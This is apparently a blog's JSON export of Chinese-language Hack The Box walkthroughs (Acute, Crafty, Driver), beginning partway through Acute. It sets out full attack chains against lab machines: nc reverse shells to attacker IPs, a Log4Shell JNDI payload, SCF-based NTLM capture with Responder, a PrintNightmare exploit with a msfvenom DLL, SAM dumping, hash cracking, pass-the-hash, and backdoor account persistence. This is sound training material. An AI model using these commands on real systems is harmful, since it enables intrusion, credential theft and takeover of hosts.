$cred -ConfigurationName dc_manage -ScriptBlock { type c:\\users\\imonks\\desktop\\user.txt } invoke-command -computerName ATSSERVER -Credential $cred -ConfigurationName dc_manage -ScriptBlock { get-childitem -force ..\\desktop } 在imonks用户的desktop中看到一个wm.ps1脚本\n$securepasswd = \u0026#39;01000000d08c9ddf0115d1118c7a00c04fc297eb0100000096ed5ae76bd0da4c825bdd9f24083e5c0000000002000000000003660000c00000001000000080f704e251793f5d4f903c7158c8213d0000000004800000a000000010000000ac2606ccfda6b4e0a9d56a20417d2f67280000009497141b794c6cb963d2460bd96ddcea35b25ff248a53af0924572cd3ee91a28dba01e062ef1c026140000000f66f5cec1b264411d8a263a2ca854bc6e453c51\u0026#39; $passwd = $securepasswd | ConvertTo-SecureString $creds = New-Object System.Management.Automation.PSCredential (\u0026#34;acute\\jmorgan\u0026#34;, $passwd) Invoke-Command -ScriptBlock {Get-Volume} -ComputerName Acute-PC01 -Credential $creds 能看到这个脚本里设置了passwd，设置了creds，并且通过jmorgan用户调用命令Get-Volume，可以把Get-Volume命令替换成反弹shell的命令然后执行这个脚本从而以jmorgan用户的身份执行反弹shell\nInvoke-Command -ScriptBlock { ((cat ..\\desktop\\wm.ps1 -Raw) -replace \u0026#39;Get-Volume\u0026#39;, \u0026#39;C:\\utils\\nc64.exe -e cmd 10.10.14.6 443\u0026#39;) | sc -Path ..\\desktop\\wm.ps1 } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred 如果要把C:\\utils\\nc64.exe -e cmd 10.10.14.24 443换成C:\\utils\\nc.exe -e cmd 10.10.14.24 443，需要把C:\\utils\\nc64.exe -e cmd 10.10.14.24 443写成C:\\\\utils\\\\nc64.exe -e cmd 10.10.14.24 443因为powershell的-replace使用正则表达式\n调用改写之后的wm.ps1脚本，得到jmorgan用户的shell\ninvoke-command -computerName ATSSERVER -Credential $cred -ConfigurationName dc_manage -ScriptBlock { c:\\users\\imonks\\desktop\\wm.ps1 } 提权 # jmorgan用户已经是本地管理员用户\nPS C:\\Users\\jmorgan\\Documents\u0026gt; net localgroup administrators net localgroup administrators Alias name administrators Comment Administrators have complete and unrestricted access to the computer/domain Members ------------------------------------------------------------------------------- ACUTE\\Domain Admins ACUTE\\jmorgan Administrator The command completed successfully. 既然已经是管理员账户，直接拿一下sam和system\nreg save HKLM\\sam sam.bak reg save HKLM\\system system.bak 直接通过msf控制台将sam和system文件下载到kali即可\ndownload sam.bak download system.bak impacket-secretsdump + hashcat破解NTML # 使用impacket的secretsdump工具拿到hash\n└─$ impacket-secretsdump -sam sam.bak -system system.bak LOCAL Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies [*] Target system bootKey: 0x44397c32a634e3d8d8f64bff8c614af7 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash) Administrator:500:aad3b435b51404eeaad3b435b51404ee:a29f7623fd11550def0192de9246f46b::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:24571eab88ac0e2dcef127b8e9ad4740::: Natasha:1001:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d::: [*] Cleaning up... .\\hashcat.exe .\\hashes\\hash.sam .\\hashes\\rockyou.txt Dictionary cache built: * Filename..: .\\hashes\\rockyou.txt * Passwords.: 14344392 * Bytes.....: 139921507 * Keyspace..: 14344385 * Runtime...: 1 sec 31d6cfe0d16ae931b73c59d7e0c089c0: a29f7623fd11550def0192de9246f46b:Password@123 Approaching final keyspace - workload adjusted. 通过hashcat破解出了administrator用户的NT哈希Password@123\nawallace chall edavies imonks jmorgan lhopkins Password@123 Acute-PC01 PSWA界面用Password@123没有用户能成功登录，invoke-command用awallace用户成功执行\nawallace, Password@123 PS C:\\Users\\jmorgan\\Documents\u0026gt; invoke-command -computerName ATSSERVER -Credential $cred -ConfigurationName dc_manage -ScriptBlock { cat \u0026#34;c:\\program files\\keepmeon\\keepmeon.bat\u0026#34; } invoke-command -computerName ATSSERVER -Credential $cred -ConfigurationName dc_manage -ScriptBlock { cat \u0026#34;c:\\program files\\keepmeon\\keepmeon.bat\u0026#34; } REM This is run every 5 minutes. For Lois use ONLY @echo off for /R %%x in (*.bat) do ( if not \u0026#34;%%x\u0026#34; == \u0026#34;%~0\u0026#34; call \u0026#34;%%x\u0026#34; ) keepmeon.bat脚本为Lois用户使用, 每5分钟运行一次\nfor /R %%x in (*.bat)递归查找当前目录以及子目录的所有bat文件\nif not \u0026quot;%%x\u0026quot; == \u0026quot;%~0\u0026quot; call \u0026quot;%%x\u0026quot;，如果和%~0，也就是当前这个bat文件不相同，就调用这个bat文件\n这里思路很简单，可以尝试以lois身份将当前用户添加到一个管理员组中，比如之前在docx中看到的\nLois is the only authorized personnel to change Group Membership, Contact Lois to have this approved and changed if required. Only Lois can become site admin. 查看一下当前有哪些组net group\ninvoke-command -computerName ATSSERVER -Credential $cred -ConfigurationName dc_manage -ScriptBlock { net group } Group Accounts for \\\\ ------------------------------------------------------------------------------- *Cloneable Domain Controllers *DnsUpdateProxy *Domain Admins *Domain Computers *Domain Controllers *Domain Guests *Domain Users *Enterprise Admins *Enterprise Key Admins *Enterprise Read-only Domain Controllers *Group Policy Creator Owners *Key Admins *Managers *Protected Users *Read-only Domain Controllers *Schema Admins *Site_Admin The command completed with one or more errors. Site_Admin明显不是一个默认的域用户组，可以具体查看一下这个组\ninvoke-command -computerName ATSSERVER -Credential $cred -ConfigurationName dc_manage -ScriptBlock { net group Site_Admin } Group name Site_Admin Comment Only in the event of emergencies is this to be populated. This has access to Domain Admin group Members ------------------------------------------------------------------------------- The command completed successfully. Comment显示只在紧急情况下才需要写入，并且具有Domain Admin group的权限，当前这个组并没有任何成员，可以写一个bat脚本，调用lois的权限，将当前用户加入到Site_Admin这个高权限用户组中.\ninvoke-command -computerName ATSSERVER -Credential $cred -ConfigurationName dc_manage -ScriptBlock { set-content -Path \u0026#34;c:\\program files\\keepmeon\\aaa.bat\u0026#34; -Value \u0026#34;net group site_admin awallace /add\u0026#34;} 等待片刻之后能看到把当前用户加入到了site_admin组中\nPS C:\\utils\u0026gt; invoke-command -computerName ATSSERVER -Credential $cred -ConfigurationName dc_manage -ScriptBlock { net group site_admin } invoke-command -computerName ATSSERVER -Credential $cred -ConfigurationName dc_manage -ScriptBlock { net group site_admin } Group name Site_Admin Comment Only in the event of emergencies is this to be populated. This has access to Domain Admin group Members ------------------------------------------------------------------------------- awallace The command completed successfully. 这样就可以通过invoke-command读取root flag了\nPS C:\\utils\u0026gt; invoke-command -computerName ATSSERVER -Credential $cred -ConfigurationName dc_manage -ScriptBlock { get-content c:\\users\\administrator\\desktop\\root.txt } ","date":"23 July 2025","externalUrl":null,"permalink":"/posts/htb-acute/","section":"Posts","summary":"","title":"HTB Acute","type":"posts"},{"content":"这台靶机发布于2024年2月10日，windows靶机，HTB社区难度评级为easy。 首先在前期的信息收集环节中扫描到一个正在运行的Minecraft 1.16.5服务器，通过搜索了解到这个版本的Minecraft存在log4shell漏洞，通过这个核弹级漏洞得到了初始的立足点， 在后续的提权过程中，因为本身服务器是Windows10，juicy potato等常见的一些利用在这个版本的Windows中是不能运行的，通过内核提权不行的情况下，想到服务器本身运行Minecraft，这代表着一定存在Java程序，在系统中翻找之后找到一个Java插件，通过jd-gui反编译这个jar包，找到了一个可能的密码，通过这个密码尝试登录administrator用户，通过runascs.exe解决了cli执行runas时，因为UAC的原因无法输入密码的问题，至此已经得到administrator用户的shell 之后通过psexec配合nc，通过administrator用户执行psexec，从而将权限提升到nt authority\\system，拿到整个系统的最高权限。\nRecon # ip=10.10.11.249 sudo nmap -sT --min-rate 10000 -p- $ip sudo nmap -sU --top-ports 20 crafty.htb -oA nmapscan/udp sudo nmap -sT -sC -sV -O -p80,25565 $ip -oA nmapscan/details PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 |_http-title: Did not follow redirect to http://crafty.htb |_http-server-header: Microsoft-IIS/10.0 25565/tcp open minecraft Minecraft 1.16.5 (Protocol: 127, Message: Crafty Server, Users: 0/100) Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2019|10 (97%) OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10 Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%) No exact OS matches for host (test conditions non-ideal). Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 16.11 seconds 扫描结果中有一条nmap没有自动跟随重定向，得到一个域名crafty.htb, 添加到hosts文件\nsudo sed -i \u0026#39;1i 10.10.11.249 crafty.htb\u0026#39; /etc/hosts Web # 80端口是一个mincraft服务器的介绍页面，商店，投票，论坛等内容都是coming soon状态，主页有一行Join 1277 other players on play.crafty.htb，查看一下play.crafty.htb有什么不一样的内容，并且根据这个信息可以尝试爆破一下http host头，查看是不是有其他的页面，这里对于UDP端口的扫描没有看到53端口开启, 所以应该不是基于子域名的分站点，大概率是vhost\ngobuster vhost -u http://crafty.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain -r -k -t 100 \u0026ndash;append-domain: 将url添加自动添加到字典后 -r: 跟踪重定向 -k: 不进行tls验证\nMinecraft # 端口25565是Minecraft游戏服务器的默认端口，包括nmap的扫描结果也显示了此处运行的是Minecraft 1.16.5版本，searchsploit当中只搜索到一个Minecraft启动器的潜在利用，并且版本还是1.6.61的\n搜索之后找到Minecraft 1.16.5版本存在log4shell，这是一个发布于2021年的核弹级漏洞\nlog4shell # log4shell是一个log4j2框架存在的RCE漏洞，编号：CVE-2021-44228，影响 Apache Log4j 2 版本 \u0026lt; 2.15.0\nlog4j # log4j本身是一个Java的高性能日志框架，框架本身使用了JNDI这个Java提供的，用于Java程序访问命名服务(DNS, LDAP)的API接口\nJNDI # JNDI是Java提供的基本API，用于让Java程序访问命名服务，JNDI存在注入，支持${jndi:ldap://evil.com/x}这样的语法，从而使得Log4j2解析日志时，解析了ldap地址的恶意内容，实现RCE\n它的原理可以概括为：\n利用 Log4j2 中对日志内容进行 JNDI 动态解析 的功能，注入恶意 LDAP 请求 → 远程加载并执行攻击者提供的 Java 类（字节码） → 完全控制目标服务器。\n漏洞成因 # log4j的lookups功能可以用来查找变量，比如logger.info(\u0026quot;User logged in: {}\u0026quot;, \u0026quot;${java:version}\u0026quot;)，这样可以输出Java版本，但是它也支持使用${jndi:ldap://evil.com/obj}这样的写法来调用jndi并且通过ldap协议调，当这些内容被加入日志的时候，恶意代码立即执行\n这也就意味着一切可以写入日志的行为都会触发这个漏洞，并且因为支持使用ldap这样的应用广泛的协议，比如windows AD域的实现，ldap协议就是其中关键的一环，基于此。log4shell影响范围之广，利用方式简单，并且可以称之为是核弹级的漏洞\n漏洞流程 # 攻击者发送 payload： ${jndi:ldap://attacker.com/Exploit} ↓ 被日志写入（如用户名、User-Agent、错误信息） Log4j2 解析字符串中的 ${} → 调用 JNDI 解析 ↓ JNDI 请求 ldap://attacker.com/Exploit 攻击者恶意 LDAP 服务器响应 → 返回包含远程类加载路径的对象 ↓ Log4j 通过 Java 原生机制加载远程类（RCE） 攻击者代码执行成功 关于这个漏洞已验证的攻击面，可以查看这个github仓库\nexploit log4j # 参考这篇medium的博客 TLAUNCHER启动器\nsudo apt install ./tlauncher-linux-installer.deb -y 在kali的start menu就可以启动tlauncher 选择release 1.16.5\nMinecraft-Console-Client # tlauncher下载的太慢了，并且现在tlauncher是.deb包，设置代理不太方便，直接换用命令行工具Minecraft-Console-Client\nwget https://github.com/MCCTeam/Minecraft-Console-Client/releases/download/20250522-285/MinecraftClient-20250522-285-linux-x64 mv MinecraftClient-20250522-285-linux-x64 MinecraftClient \u0026amp;\u0026amp; chmod +x MinecraftClient sudo cp MinecraftClient /usr/local/bin MinecraftClient 然后输入用户名，密码直接回车，输入靶机的IP地址即可连接\n可以先做一下测试，ldap协议默认是389端口\nsudo rlwrap -cAr nc -lvnp 389 ${jndi:ldap://10.10.14.25/test} └─$ sudo rlwrap -cAr nc -lvnp 389 listening on [any] 389 ... connect to [10.10.14.25] from (UNKNOWN) [10.10.11.249] 49682 0 0 0 ` 验证漏洞是存在的，那么现在找一个exploit直接利用即可\nlog4shell exploit # log4j poc\ngit clone https://github.com/kozmer/log4j-shell-poc.git python -m venv . cd bin source activate pip install -r ../requirements.txt 需要安装一下java8，通过bugmenot网站直接拿一个现成的#Oracle账号\ntar -zxf jdk-8u202-linux-x64.tar.gz 这个poc会创建一个web服务器和ldap服务器，并且通过命令行参数指定反弹shell的端口，这个脚本默认是执行的/bin/bash，把它改成powershell.exe\nsudo rlwrap -cAr nc -lvnp 9001 python3 poc.py --userip 10.10.14.25 --webport 8000 --lport 9001 ${jndi:ldap://10.10.14.25:1389/a} 登录到Minecraft服务器，发送一下payload: ${jndi:ldap://10.10.14.25:1389/a}即可得到反弹shell\nPrivilege Escalation # 将.jar文件搬运到kali中，并反编译分析一下jar文件的内容。\npython /usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support -username qolt -password pass@word! net use \\\\10.10.14.25\\share /user:qolt pass@word! PS C:\\users\\svc_minecraft\\server\\plugins\u0026gt; copy-item .\\playercounter-1.0-SNAPSHOT.jar \\\\10.10.14.25\\share jd-gui进行java反编译 # jd-gui\nwget https://github.com/java-decompiler/jd-gui/releases/download/v1.6.6/jd-gui-1.6.6.deb public final class Playercounter extends JavaPlugin { public void onEnable() { Rcon rcon = null; try { rcon = new Rcon(\u0026#34;127.0.0.1\u0026#34;, 27015, \u0026#34;s67u84zKq8IXw\u0026#34;.getBytes()); } catch (IOException e) { throw new RuntimeException(e); } catch (AuthenticationException e2) { throw new RuntimeException(e2); } runascs进行显式登录 # 尝试本地开启winrm # 首先尝试当前的用户能不能开启winrm\nenable-psremoting -force set-wsmanquickconfig -force 都是没有权限执行，那就尝试直接显式登录到administrator\n通过s67u84zKq8IXw尝试登录administrator时，没有输入密码的机会，如果是gui界面可以解决，但是cli界面的话可以通过runascs来解决这个UAC的问题\nwget https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip unzip RunasCs.zip iwr http://10.10.14.25/RunasCs.exe -outfile runascs.exe rlwrap -cAr nc -lvnp 443 .\\runascs.exe administrator \u0026#39;s67u84zKq8IXw\u0026#39; powershell -r 10.10.14.25:443 -t 0 -t 0: 背景运行，从而即使运行出错也不会阻塞当前shell\n提权到system32 # 使用microsoft的psexec程序，提权到system PsTools nc64.exe\niwr http://10.10.14.25/PsExec64.exe -outfile PsExec64.exe iwr http://10.10.14.25/nc64.exe -outfile nc64.exe .\\PsEXEC64.exe -accepteula -i -s cmd.exe /c \u0026#34;C:\\programdata\\apps\\nc64.exe 10.10.14.25 443 -e powershell.exe\u0026#34; psexec，-i参数指定交互式运行，-s指定以系统权限执行，通过psexec调用cmd.exe，在通过cmd.exe调用nc，再通过nc调用powershell从而得到反弹shell\n","date":"20 July 2025","externalUrl":null,"permalink":"/posts/htb-crafty/","section":"Posts","summary":"","title":"HTB Crafty","type":"posts"},{"content":"这是一台发布于2021年12月2日的靶机，HTB投票结果显示这台靶机为easy难度，Driver涉及到针对smb服务，利用scf文件，触发smb服务的NTLMv2协议，从而拿到初始凭证，通过开放的winrm端口登陆之后，提权过程中利用2021年6月8日发布的针对windows print spooler产生的提权漏洞，从而实现从普通用户提升到nt authority\\system权限, 最后使用net user配合impacket-secretdump进行持久化权限，这个持久化方式在实战中不推荐使用\n关于windows print spooler的漏洞，详细内容可以参考这篇博客0xdf, 在后文也有提到\nRecon # nmap扫描的时候用-sS反而特别慢, 一直扫不出结果\nsudo nmap --min-rate 10000 -sT -p- $ip -oA nmapscan/ports 如果实在太慢的话用rustscan好了\nsudo apt install ./rustscan_2.4.1-1_amd64.deb -y rustscan -a $ip --- Open 10.10.11.106:80 Open 10.10.11.106:135 Open 10.10.11.106:445 访问80端口的页面，存在基于HTTP头的身份验证，Basic Authorization，使用弱密码成功登录\nadmin, admin 或者也可以使用nmap的http爆破脚本\n└─$ nmap --script=http-brute -p 80 10.10.11.106 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-01 12:15 EDT NSE: [http-brute] usernames: Time limit 10m00s exceeded. NSE: [http-brute] usernames: Time limit 10m00s exceeded. NSE: [http-brute] passwords: Time limit 10m00s exceeded. Nmap scan report for driver.htb (10.10.11.106) Host is up (0.24s latency). PORT STATE SERVICE 80/tcp open http | http-brute: | Accounts: | admin:admin - Valid credentials |_ Statistics: Performed 1244 guesses in 609 seconds, average tps: 3.0 看到一个域名driver.htb, 并且页面本身可以上传文件，成功上传了php木马，找一下上传的位置。brupsuite抓包一下身份凭证, 在HTTP Header中带上\nferoxbuster -u http://driver.htb/ -H \u0026#34;Authorization: Basic YWRtaW46YWRtaW4=\u0026#34; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php 爆破半天也没能找到任何上传的点位或者上传的php文件，如果服务器把上传的目录设置成一个特别的名字，那么扫不到这个路径是很正常的\nsmb服务枚举 # enum4linux-ng -A driver.htb └─$ nxc smb driver.htb --shares -u \u0026#39;anonymous\u0026#39; -p \u0026#39;\u0026#39; SMB 10.10.11.106 445 DRIVER [*] Windows 10 Build 10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True) SMB 10.10.11.106 445 DRIVER [-] DRIVER\\anonymous: STATUS_LOGON_FAILURE 能看到smb服务没能成功枚举到什么内容\nSMB Server sniff NTLM离线破解 sfc诱导 # 这时已知存在smb服务，并且web页面的file share关键字表示，大概率传上去的文件会给到smb服务用于共享，经过一些对于smb服务的枚举，没能找到任何登录smb服务的方式。\n但是当smb服务访问UNC路径时(比如 \\\\10.10.10.10\\shares)，会自动带上NTLM凭证尝试认证以访问这个共享文件。\n另一个需要清楚的是，内网中并不是一直都使用DNS来进行解析，如果DNS解析不成功，那么会自动降级为NetBIOS和LLMNR协议，smb会使用这种协议，除非windows的安全策略里直接禁用了这些协议。那么当smb服务访问一个DNS解析无法处理的地址的时候，自动降级为NetBIOS和LLMNR这样的广播协议，从而让responder抓取到访问向kali网卡的流量，其中正携带的NTLM密文。\n总结一下利用流程:\n上传一个可以触发DNS查询失败的，访问UNC的请求（比如scf文件），这个UNC指向kali的地址 DNS解析主机名失败后smb自动降级使用LLMNR和NetBIOS这种广播协议，其中smb会自动携带NTLM密文企图通过认证 responder监听kali的网卡流量，smb服务认为responder是正常的另一个smb服务，从而发送NTLM凭证，使得responder可以截获smb服务的NTLM密文 hashcat或者john破解NTLM 设置responder # 记得把445端口的服务关闭一下再运行responder\nsudo responder -I tun0 也可以运行sudo responder -I tun0 -v, 这样不会屏蔽掉重复的NTLM凭证\n上传scf文件 # [Shell] Command=2 IconFile=\\\\10.10.16.5\\shares [Taskbar] Command=Explorer 破解NTLM密文 # 这里这个NTLM是不能直接作为hash传入的，因为此处NTLM不仅有服务端和客户端的挑战，还带有时间戳，导致虽然是一样的用户名密码，但是不同时间点得到的NTLM凭证的值都是不同的。\nnth交叉验证密文类型，使用hashcat爆破 # nth --file digest https://twitter.com/bee_sec_san https://github.com/HashPals/Name-That-Hash tony::DRIVER:3925a13b425eost Likely NetNTLMv2, HC: 5600 JtR: netntlmv2 hashcat --help | grep -i ntlm 5600 | NetNTLMv2 | Network Protocol hashcat -m 5600 digest /usr/share/wordlists/rockyou.txt 这里虚拟机没有显卡，hashcat提示显存不足直接失败了，换了fastcrack这个小字典一样不行\njohn 破解 # john --format=netntlmv2 digest --wordlist=/usr/share/wordlists/rockyou.txt --pot=driver.pot --pot参数指定pot文件的名字，这样面对同一个文件的爆破，不同pot名称即可实现对同一个文件多次爆破\njohn --format=netntlmv2 digest --wordlist=/usr/share/wordlists/rockyou.txt --pot=driver.pot liltony (tony) 登录winrm # evil-winrm -i 10.10.11.106 -u tony -p liltony -P 5985 user flag # 查找user.txt\nGet-ChildItem -Path C:\\ -Filter user.txt -Recurse -ErrorAction SilentlyContinue 或者使用简写: gci -r -file c:\\users，或者使用type也可以\ntype C:\\Users\\tony\\Desktop\\user.txt 提权 # winpeas枚举 # 设置运行脚本执行，无文件执行winpeas\nset-executionpolicy unrestricted -scope currentuser $wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest \u0026#34;http://10.10.14.14/winPEASx64.exe\u0026#34; -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main(\u0026#34;\u0026#34;) -UseBasicParsing: 如果没有装IE浏览器,使用基本解析方式可以保证下载执行,或者浏览器初始化过程没有操作过,使用这个参数规避掉这个问题\n这里没成功执行提权程序，那么下载文件到本地再执行\n可以通过certutil.exe或者evil-winrm来下载文件\ncertutil.exe -urlcache -split -f http://10.10.14.14/winPEASx64.exe # 通过evil-winrm来传递文件 upload winPEASx64.exe 执行自动枚举脚本并将结果返回到kali\n.\\winPEASx64.exe log 指定log参数，默认将结果输出文件名为out.txt, 通过evil-winrm将文件下载回kali分析\ndownload out.txt cat out.txt | less -R batcat out.txt PS history file: C:\\Users\\tony\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt Add-Printer -PrinterName \u0026#34;RICOH_PCL6\u0026#34; -DriverName \u0026#39;RICOH PCL6 UniversalDriver V4.23\u0026#39; -PortName \u0026#39;lpt1:\u0026#39; 一条添加打印机的命令，接口是并行端口，名为lpt1,在后续列出的进程当中能看到spoolsv这个打印机的进程\nprintnightmare提权 # spoolsv是windows用来管理打印机任务的进程，是打印后台处理程序的核心进程，duckduckgo搜索一下windows spoolsv exploit, 能看到一个高频出现的漏洞printnightmare, 可以使用nxc查看一下这台靶机是否可以利用printnightmare\n关于printnightmare的更多细节可以查看这篇博客\nnxc模块检测printnightmare可用性 # 可以使用nxc的模块检测一下是不是可以进行printnightmare提权\n└─$ nxc smb driver.htb -u tony -p liltony -M printnightmare SMB 10.10.11.106 445 DRIVER [*] Windows 10 Build 10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True) SMB 10.10.11.106 445 DRIVER [+] DRIVER\\tony:liltony PRINTNIG... 10.10.11.106 445 DRIVER Vulnerable, next step https://github.com/ly4k/PrintNightmare Exploit # 我这里直接使用JohnHammond所编写的利用脚本，当然也可以通过自定义dll文件来实现其他的利用方式\nwget https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/refs/heads/main/CVE-2021-1675.ps1 upload CVE-2021-1675.ps1 Import-Module .\\cve-2021-1675.ps1 Invoke-Nightmare -NewUser \u0026#34;printer\u0026#34; -NewPassword \u0026#34;Pass@word!\u0026#34; 这里创建用户后是administrator用户，但是使用evil-winrm登录时候无法登录，可能是限制了administrator权限的用户通过winrm远程登录，这样的话可以自定义一个反弹shell的dll文件，通过printnightmare允许这个dll文件\nmsfvenom生成dll # msfvenom -p windows/x64/powershell_reverse_tcp LHOST=10.10.14.14 LPORT=443 -f dll -o reverse.dll sudo rlwrap -Ac nc -lvnp 443 upload reverse.dll Import-Module .\\cve-2021-1675.ps1 Invoke-Nightmare -DLL \u0026#34;C:\\programdata\\apps\\reverse.dll\u0026#34; 执行之后拿下system32权限\nroot.txt # type C:\\users\\administrator\\desktop\\root.txt 持久化 # 通过net user建立一个administrator组的用户，来实现持久化权限（这种方式实战中不推荐使用，很容易被查到）\nnet user drive Pass@word! /add net localgroup administrators drive /add 使用impacket工具包dump hash # sudo impacket-secretsdump \u0026#39;drive:Pass@word!\u0026#39;@driver.htb # 用户名:RID:LM哈希:NT哈希::: Administrator:500:aad3b435b51404eeaad3b435b51404ee:d1256cff8b5b5fdb8c327d3b6c3f5017::: 通过secretdump脚本拿到了administrator用户的NTLM哈希，可以通过这个哈希来登录administrator用户(Pass-the-hash)\nsudo nxc winrm driver.htb -u Administrator -H d1256cff8b5b5fdb8c327d3b6c3f5017 ","date":"18 July 2025","externalUrl":null,"permalink":"/posts/htb-driver/","section":"Posts","summary":"","title":"HTB Driver","type":"posts"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":"","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"}]